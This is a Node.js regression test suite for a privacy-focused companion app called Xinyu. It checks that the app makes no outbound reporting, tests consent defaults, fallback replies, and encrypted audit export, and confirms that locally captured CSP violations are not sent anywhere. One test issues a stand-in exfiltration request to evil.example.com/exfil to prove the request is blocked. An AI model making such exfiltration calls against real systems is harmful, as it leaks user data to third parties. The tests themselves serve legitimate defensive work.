"use strict";
/**
 * c-regression.js · 心屿 候选 C（隐私/端侧增强）· 冻结合规 + A/B 回归基线
 * ====================================================================
 * 运行：node --test test/c-regression.js
 * 依赖：零 npm 依赖，仅 node:test + node:assert + node:fs + node:path。
 * 模式：与 qa-voice-acceptance.test.js / ltm.test.js / xinyu-mcp-selftest.mjs
 *       对齐的 Node 最小浏览器 shim（window/document/fetch/XHR/WebSocket/
 *       EventSource/navigator.sendBeacon/localStorage/caches/crypto.subtle/
 *       TextEncoder + 语音/离线桩）。
 *
 * 覆盖（C-E5 · A 项）：
 *  1. 零上报证明 + 第三方 fetch 被拦截(blocked++)
 *  2. A/B 不退化（voice.js / longterm-memory.js 核心操作零外发）
 *  3. ConsentStore 默认值（tts/asr/ltm=true、cloudSync=false）
 *  4. LocalHeuristic 兜底（非空 / 可用 / 零外部调用）
 *  5. ReplyRouter 降级链（401 / 超时 / 连续失败 → heuristic）
 *  6. OfflineProbe 三态 + CacheWarmer 独立命名空间 xinyu-edge-v1
 *  7. PrivacyScore 计算（0-100，默认优）
 *  8. AuditExporter AES-GCM 往返（密钥 extractable:false）
 *  9. CSP 本地捕获（report-only、无 report-uri、不连外部）
 * 10. 冻结字节守卫（engine.js/sw.js/memory.js/test/baseline.js）
 *
 * 铁律：只新增本测试文件；不修改实现/冻结线；不引入 npm 依赖；
 *       绝不改动 test/baseline.js。
 */

const test = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const path = require("node:path");

// ====================================================================
// 1) Node 最小浏览器 shim（必须在 require 任何 C 模块「之前」安装）
// ====================================================================
let fetchCount = 0;        // 被放行(allowed)的外发计数（blocked 由 AuditProbe 自记）
let xhrCount = 0;
let beaconCount = 0;
let fetchShouldFail = false; // 仅用于离线三态「degraded」驱动（本 shim 下同源 HEAD 被当作 blocked）

// localStorage（Map 桩，支持 clear 供 beforeEach 复位）
const mem = new Map();
globalThis.localStorage = {
  getItem(k) { return mem.has(k) ? mem.get(k) : null; },
  setItem(k, v) { mem.set(k, String(v)); },
  removeItem(k) { mem.delete(k); },
  clear() { mem.clear(); },
  get length() { return mem.size; },
  key(i) { return [...mem.keys()][i] ?? null; },
};

// window 指向 globalThis（C 模块经 window 暴露，回退 globalThis）
globalThis.window = globalThis;

// 网络外发句柄桩（计数 + 可控失败），供 AuditProbe 包装
function fetchStub(input) {
  fetchCount++;
  if (fetchShouldFail) return Promise.reject(new Error("network down (shim)"));
  void input;
  return Promise.resolve({ ok: true, status: 200, json: async () => ({}) });
}
globalThis.fetch = fetchStub;

globalThis.XMLHttpRequest = class XMLHttpRequest {
  constructor() { xhrCount++; this.__auditBlocked = false; }
  open() {}
  send() {}
};

// navigator（Node 下全局 navigator 可能只读，用 defineProperty 兜底）
function makeNavigator() {
  return { onLine: true, sendBeacon() { beaconCount++; return true; }, userAgent: "xinyu-shim" };
}
try {
  Object.defineProperty(globalThis, "navigator", { value: makeNavigator(), configurable: true, writable: true });
} catch (e) {
  try { globalThis.navigator = makeNavigator(); } catch (e2) {}
}
if (!globalThis.navigator) globalThis.navigator = makeNavigator();

// WebSocket / EventSource 桩（供 AuditProbe 包装，不实际使用）
globalThis.WebSocket = class WebSocket { constructor(u) { this.url = u; } };
globalThis.EventSource = class EventSource { constructor(u) { this.url = u; } };

// crypto / TextEncoder（Node 22 自带 globalThis.crypto.subtle；兜底 import）
if (!globalThis.crypto || !globalThis.crypto.subtle) {
  try { globalThis.crypto = require("node:crypto").webcrypto; } catch (e) {}
}

// caches 桩（记录被打开的 cache 名，用于断言 C 不篡改 sw key=19）
const openedCaches = new Set();
globalThis.caches = {
  open(name) {
    openedCaches.add(name);
    return Promise.resolve({ put() { return Promise.resolve(); }, keys() { return Promise.resolve([]); } });
  },
  has(name) { return Promise.resolve(openedCaches.has(name)); },
};

// document 桩（EventTarget 风格 + createElement/head/getElementById），供 CSP 注入与本地捕获
const docListeners = {};
const docShim = {
  head: { children: [], appendChild(el) { this.children.push(el); } },
  getElementById() { return null; },
  createElement(tag) {
    return { tag, id: "", content: "", attrs: {}, setAttribute(n, v) { this.attrs[n] = v; } };
  },
  addEventListener(type, cb) { (docListeners[type] = docListeners[type] || []).push(cb); },
  dispatchEvent(ev) { (docListeners[ev.type] || []).forEach((cb) => { try { cb(ev); } catch (e) {} }); return true; },
  __xn_csp_bound: false,
};
globalThis.document = docShim;

// 语音桩（供 voice.js 加载与 A/B 测试）
let lastUtterance = null;
let speakCalls = 0;
let srConstructed = 0;
globalThis.SpeechSynthesisUtterance = class SpeechSynthesisUtterance {
  constructor(text) { this.text = text; this.lang = ""; this.rate = 1; this.pitch = 1; this.volume = 1; this.voice = null; lastUtterance = this; }
};
globalThis.window.speechSynthesis = {
  speak(u) { speakCalls++; if (typeof u.onstart === "function") u.onstart(); },
  cancel() {},
  getVoices() { return []; },
};
globalThis.window.SpeechRecognition = class SpeechRecognition {
  constructor() { this.lang = ""; this.continuous = false; this.interimResults = false; this.onresult = null; this.onerror = null; this.onend = null; srConstructed++; }
  start() {}
  stop() { if (this.onend) this.onend(); }
  abort() { if (this.onend) this.onend(); }
};
globalThis.window.webkitSpeechRecognition = globalThis.window.SpeechRecognition;

// location 故意保持 undefined：使绝对 URL 一律「非同源」→ 被 AuditProbe 判为 blocked，
// 从而让「第三方外发被拦截」断言稳定成立（与浏览器同源保护互补，不冲突）。

// ====================================================================
// 2) 加载 C 模块（window 钩子 + module.exports 双暴露）
// ====================================================================
const AuditProbe = require("../audit-probe.js");
const ConsentStore = require("../consent-store.js");
const LocalHeuristic = require("../local-heuristic.js");
const RR = require("../reply-router.js");       // { ReplyRouter, CloudChatProvider, LocalModelAdapter }
const OfflineProbe = require("../offline-probe.js");
const CacheWarmer = require("../cache-warmer.js");
const PrivacyScore = require("../privacy-score.js");
const AuditExporter = require("../audit-export.js");
const CspInjector = require("../csp-inject.js");

// A/B 模块（仅在 C-E5 测试 #2 内触发其核心操作，验证零外发不退化）
require("../voice.js");
require("../longterm-memory.js");
const Voice = globalThis.window.Voice;
const LTM = globalThis.window.LTM;

// 最早安装零上报探针（包装 fetch/XHR/WS/beacon/EventSource + 资源标签钩子）
AuditProbe.install();

// ====================================================================
// 3) beforeEach：复位计数与 localStorage，保证用例隔离
// ====================================================================
test.beforeEach(() => {
  mem.clear();
  fetchCount = 0; xhrCount = 0; beaconCount = 0;
  fetchShouldFail = false;
  try { globalThis.navigator.onLine = true; } catch (e) {}
  try { AuditProbe.getInstance().reset(); } catch (e) {}
});

// ====================================================================
// 1. 零上报证明 + 第三方外发被拦截
// ====================================================================
test("1-零上报证明：install 后 zeroReporting===true 且 blocked===0", () => {
  const r = AuditProbe.getInstance().proveZeroReporting();
  assert.strictEqual(r.zeroReporting, true, "初始应零上报");
  assert.strictEqual(r.blocked, 0, "初始 blocked 应为 0");
});

test("1-第三方 fetch 被拦截且 blocked++（显式 evil 域名）", async () => {
  const ap = AuditProbe.getInstance();
  assert.strictEqual(ap.proveZeroReporting().blocked, 0);
  // 第三方域名：应被 AuditProbe 拦截（reject）
  await assert.rejects(
    () => fetch("https://evil.example.com/exfil"),
    /Blocked by Xinyu privacy audit/
  );
  const r = ap.proveZeroReporting();
  assert.strictEqual(r.blocked, 1, "第三方外发应被记入 blocked++");
  assert.strictEqual(r.zeroReporting, false, "存在被拦截的外发时 zeroReporting 应为 false");
});

// ====================================================================
// 2. A/B 不退化（零外发）
// ====================================================================
test("2-A/B 不退化：voice.js + longterm-memory.js 核心操作后零外发", async () => {
  const ap = AuditProbe.getInstance();
  assert.ok(Voice && typeof Voice.speak === "function", "window.Voice 应已挂载");
  assert.ok(LTM && typeof LTM.distillFromTurns === "function", "window.LTM 应已挂载");

  // A（语音）：TTS + ASR 同意门
  speakCalls = 0;
  assert.strictEqual(Voice.speak("小暖在听"), true, "默认 tts 开启应朗读");
  assert.strictEqual(speakCalls, 1);
  Voice.setConsent(true);
  Voice.setEnabled("asr", true);
  const okListen = Voice.startListen(() => {});
  assert.strictEqual(okListen, true, "同意后 startListen 应成功");
  Voice.stopListen();

  // B（长期记忆）：蒸馏 + 检索（MemoryBackend 纯本地）
  await LTM.init({ backend: new LTM.MemoryBackend() });
  LTM.setEnabled(true);
  const d = await LTM.distillFromTurns([{ role: "user", text: "我喜欢小暖" }], "c_reg", "s1");
  assert.strictEqual(d.added, 1);
  const rec = await LTM.retrieveForSession("c_reg", "小暖");
  assert.ok(Array.isArray(rec) && rec.length > 0);

  // 断言：A/B 全程无任何被拦截的外发（blocked 仍为 0）
  const r = ap.proveZeroReporting();
  assert.strictEqual(r.blocked, 0, "A/B 触发期间不应产生被拦截的外发");
  assert.strictEqual(r.zeroReporting, true, "A/B 不退化：零上报闭环保持");
  // 语音探针自证
  if (typeof Voice.__zeroReportProbe === "function") {
    assert.strictEqual(Voice.__zeroReportProbe().outbound, 0);
  }
});

// ====================================================================
// 3. ConsentStore 默认值
// ====================================================================
test("3-ConsentStore 默认：tts/asr/ltm=true、cloudSync=false", () => {
  const cs = new ConsentStore();
  assert.strictEqual(cs.get("tts"), true);
  assert.strictEqual(cs.get("asr"), true);
  assert.strictEqual(cs.get("ltm"), true);
  assert.strictEqual(cs.get("cloudSync"), false);
  // 持久化键仅写入 xinyu.consent，绝不触碰 xinyu.ltm.* / xinyu.voice.*
  cs.save();
  const keys = [...mem.keys()];
  assert.ok(keys.includes("xinyu.consent"), "应写入 xinyu.consent");
  assert.ok(!keys.some((k) => k.startsWith("xinyu.ltm")), "绝不写入 xinyu.ltm.*");
  assert.ok(!keys.some((k) => k.startsWith("xinyu.voice")), "绝不写入 xinyu.voice.*");
});

// ====================================================================
// 4. LocalHeuristic 兜底
// ====================================================================
test("4-LocalHeuristic 兜底：非空 / 可用 / 零外部调用", async () => {
  const h = new LocalHeuristic();
  assert.strictEqual(h.isAvailable(), true, "兜底永远可用");
  const before = fetchCount;
  const r1 = await h.generate("我想你了小暖", { nick: "宝" });
  assert.strictEqual(typeof r1, "string", "generate 应返回字符串");
  assert.ok(r1.length > 0, "generate 应返回非空回复");
  // 空输入也应安全回落（不静默）
  const r2 = await h.generate("", {});
  assert.ok(typeof r2 === "string" && r2.length > 0, "空输入回落仍非空");
  // 过程零外部调用
  assert.strictEqual(fetchCount, before, "LocalHeuristic 过程零外部调用");
});

// ====================================================================
// 5. ReplyRouter 降级链
// ====================================================================
function failingCloud(kind) {
  return {
    name: "cloud",
    isAvailable: () => true,
    generate() {
      if (kind === "401") return Promise.reject(Object.assign(new Error("HTTP 401 Unauthorized"), { httpStatus: 401 }));
      if (kind === "timeout") return Promise.reject(Object.assign(new Error("timeout"), { __timeout: true }));
      return Promise.reject(new Error("boom network"));
    },
  };
}

test("5-降级链：cloud(必失败) → local(不可用) → heuristic 返回兜底", async () => {
  const router = new RR.ReplyRouter();
  const localUnavail = new RR.LocalModelAdapter({}); // 无 LocalModel → isAvailable=false
  const heuristic = new LocalHeuristic();
  assert.strictEqual(localUnavail.isAvailable(), false, "默认 LocalModel 未加载 → 跳过");
  router.registerProviders([failingCloud("boom"), localUnavail, heuristic]);
  const res = await router.route("你好小暖");
  assert.strictEqual(typeof res, "string", "route 应返回字符串");
  assert.ok(res.length > 0, "route 应返回非空（落到 heuristic）");
  assert.strictEqual(router.lastVia, "heuristic", "最终应由 heuristic 兜底");
});

test("5-降级判定：401 立即降级且致死（reason=401）", async () => {
  const router = new RR.ReplyRouter();
  let ev = null;
  router.onDegrade((e) => { ev = e; });
  router.registerProviders([failingCloud("401"), new RR.LocalModelAdapter({}), new LocalHeuristic()]);
  const res = await router.route("hi");
  assert.ok(res.length > 0);
  assert.ok(ev && ev.reason === "401", "401 应立即降级（reason=401）");
});

test("5-降级判定：超时立即降级（reason=timeout）", async () => {
  const router = new RR.ReplyRouter();
  let ev = null;
  router.onDegrade((e) => { ev = e; });
  router.registerProviders([failingCloud("timeout"), new RR.LocalModelAdapter({}), new LocalHeuristic()]);
  const res = await router.route("hi");
  assert.ok(res.length > 0);
  assert.ok(ev && ev.reason === "timeout", "超时应立即降级（reason=timeout）");
});

test("5-降级判定：连续 2 次失败 → 降级（reason=consecutive_failures）", async () => {
  const router = new RR.ReplyRouter();
  let ev = null;
  router.onDegrade((e) => { ev = e; });
  router.registerProviders([failingCloud("boom"), new RR.LocalModelAdapter({}), new LocalHeuristic()]);
  await router.route("hi");              // 第 1 次：cloud fc=1（未达阈值，不降级）→ heuristic
  assert.strictEqual(ev, null, "首次失败（fc=1）不应触发降级事件");
  await router.route("hi");              // 第 2 次：cloud fc=2 → 降级
  assert.ok(ev && ev.reason === "consecutive_failures", "连续 2 次失败应降级（reason=consecutive_failures）");
});

// ====================================================================
// 6. OfflineProbe 三态 + CacheWarmer 独立命名空间
// ====================================================================
test("6-OfflineProbe：getState 返回 online/degraded/offline 之一", async () => {
  // (a) 默认在线（navigator.onLine=true，未探测）→ online
  const a = new OfflineProbe();
  assert.strictEqual(a.getState(), "online");

  // (b) navigator.onLine=false → offline
  const prev = globalThis.navigator.onLine;
  globalThis.navigator.onLine = false;
  const b = new OfflineProbe();
  assert.strictEqual(b.getState(), "offline");
  globalThis.navigator.onLine = prev;

  // (c) 同源探测失败（本 shim 下被 AuditProbe 判为 blocked → reject）→ degraded
  const c = new OfflineProbe();
  const st = await c.checkConnectivity();
  assert.strictEqual(st, "degraded");
  assert.strictEqual(c.getState(), "degraded");

  assert.ok(["online", "degraded", "offline"].includes(a.getState()));
});

test("6-CacheWarmer：独立命名空间 xinyu-edge-v1，绝不篡改为 sw key=19", async () => {
  const cw = new CacheWarmer();
  assert.strictEqual(cw.cacheName, "xinyu-edge-v1", "缓存命名空间必须为 xinyu-edge-v1");
  // 预热关键资源（触发 caches.open）
  await cw.preloadCritical();
  assert.ok(openedCaches.has("xinyu-edge-v1"), "应打开独立 Cache 命名空间 xinyu-edge-v1");
  assert.ok(!openedCaches.has("key=19"), "绝不读写 sw 冻结缓存键 key=19");
  // 源码层面确认：CACHE_NAME 常量确为 xinyu-edge-v1，且不存在「caches.open('19')」这类
  // 实际读写 sw 冻结缓存键的代码（注释中提及「key=19」属合规说明，不算越界）。
  const src = fs.readFileSync(path.join(__dirname, "..", "cache-warmer.js"), "utf8");
  assert.strictEqual(/var CACHE_NAME\s*=\s*['"]xinyu-edge-v1['"]/.test(src), true, "CACHE_NAME 应为 xinyu-edge-v1");
  assert.strictEqual(/caches\.open\(\s*['"]19['"]/.test(src), false, "cache-warmer.js 不得打开 sw 冻结缓存键 '19'");
  // 运行时：openedCaches 仅含独立命名空间，绝不混入其它（含 sw key=19）
  assert.ok(openedCaches.size >= 1 && openedCaches.has("xinyu-edge-v1"), "运行时应打开独立 Cache 命名空间");
  assert.ok(!openedCaches.has("19"), "运行时绝不打开 sw 冻结缓存键 19");
});

// ====================================================================
// 7. PrivacyScore 计算
// ====================================================================
test("7-PrivacyScore：compute 返回 0-100；默认（无可疑上报、cloudSync=false）得高分(优)", () => {
  const ps = new PrivacyScore();
  const def = ps.compute({ blocked: 0, consented: 0, cloudSync: false, storageBytes: 0 });
  assert.strictEqual(def, 100, "默认应得满分 100");
  assert.strictEqual(ps.grade(def), "优", "满分应评级 优");
  // 边界：极端值仍落在 0-100
  const worst = ps.compute({ blocked: 999, consented: 999, cloudSync: true, storageBytes: 1e9 });
  assert.ok(worst >= 0 && worst <= 100, "compute 结果必在 0-100");
  // 单条可疑上报 -15
  assert.strictEqual(ps.compute({ blocked: 1 }), 85);
  // 云同步 -25
  assert.strictEqual(ps.compute({ cloudSync: true }), 75);
});

// ====================================================================
// 8. AuditExporter AES-GCM 往返（密钥 extractable:false，不落地）
// ====================================================================
test("8-AuditExporter：deriveKey(extractable:false) + exportEncrypted + 解密还原一致", async () => {
  const ex = new AuditExporter();
  const salt = ex.randomSalt(16);
  assert.strictEqual(salt.length, 16, "盐应为 16 字节");
  const pass = "xinyu-privacy-passphrase";
  const encKey = await ex.deriveKey(pass, salt);
  assert.strictEqual(encKey.extractable, false, "派生密钥应 extractable:false（密钥不落地）");

  const report = { blocked: 0, allowed: 3, consented: 0, note: "零上报证明", items: [{ t: 1, channel: "fetch", url: "x", action: "allowed" }] };
  const blob = await ex.exportEncrypted(report, encKey, { salt });
  assert.ok(blob instanceof Blob, "应返回 Blob");

  // 解析自包含二进制：salt(16) | iv(12) | ciphertext
  const buf = new Uint8Array(await blob.arrayBuffer());
  const outSalt = buf.slice(0, 16);
  const iv = buf.slice(16, 28);
  const ct = buf.slice(28);
  assert.deepStrictEqual([...outSalt], [...salt], "文件头盐应与派生盐一致");

  // 用「同口令 + 同盐」重新派生一枚 decrypt 用途密钥（同样 extractable:false）还原明文
  const webcrypto = globalThis.crypto;
  const km = await webcrypto.subtle.importKey("raw", new TextEncoder().encode(pass), "PBKDF2", false, ["deriveKey"]);
  const decKey = await webcrypto.subtle.deriveKey(
    { name: "PBKDF2", salt: salt, iterations: 210000, hash: "SHA-256" },
    km,
    { name: "AES-GCM", length: 256 },
    false,
    ["decrypt"]
  );
  const plainBuf = await webcrypto.subtle.decrypt({ name: "AES-GCM", iv: iv }, decKey, ct);
  const plain = JSON.parse(new TextDecoder().decode(plainBuf));
  assert.deepStrictEqual(plain, report, "解密还原明文应与原始审计日志一致");
});

// ====================================================================
// 9. CSP 本地捕获（report-only，无 report-uri，不连外部）
// ====================================================================
test("9-CSP：injectReportOnly 注入 meta；securitypolicyviolation 被本地记录、不连外部 report-uri", () => {
  const csp = new CspInjector();
  const before = fetchCount;
  csp.injectReportOnly();
  // meta 已注入 head
  assert.ok(docShim.head.children.length >= 1, "应在 head 注入 CSP meta");
  const meta = docShim.head.children[docShim.head.children.length - 1];
  assert.strictEqual(meta.attrs["http-equiv"], "Content-Security-Policy-Report-Only");
  // 关键：策略不得含 report-uri（绝不外发）
  assert.strictEqual((meta.content || "").includes("report-uri"), false, "CSP 不得含 report-uri（零上报）");

  // 派发一次违规事件，应被本地捕获
  csp.handleReport({
    type: "securitypolicyviolation",
    blockedURI: "http://evil.example.com/x.js",
    violatedDirective: "script-src",
    sourceFile: "inline",
    lineNumber: 1,
    columnNumber: 1,
    originalPolicy: meta.content,
  });
  const violations = csp.getViolations();
  assert.strictEqual(violations.length, 1, "本地应记录 1 条违规");
  assert.strictEqual(violations[0].blockedURI, "http://evil.example.com/x.js");
  // 捕获过程绝不外发
  assert.strictEqual(fetchCount, before, "违规本地捕获过程零外发");
});

// ====================================================================
// 10. 冻结字节守卫（CI 级冻结闸；不改 baseline.js）
// ====================================================================
test("10-冻结字节守卫：engine.js/sw.js/memory.js/test/baseline.js 字节长度等于冻结常量", () => {
  const FROZEN = [
    ["engine.js", 251068],
    ["sw.js", 13894],
    ["memory.js", 13333],
    ["test/baseline.js", 2646],
  ];
  for (const [rel, expected] of FROZEN) {
    const p = path.join(__dirname, "..", rel);
    const len = fs.statSync(p).size;
    assert.strictEqual(len, expected, `${rel} 字节应=${expected}，实=${len}（冻结闸触发）`);
  }
});
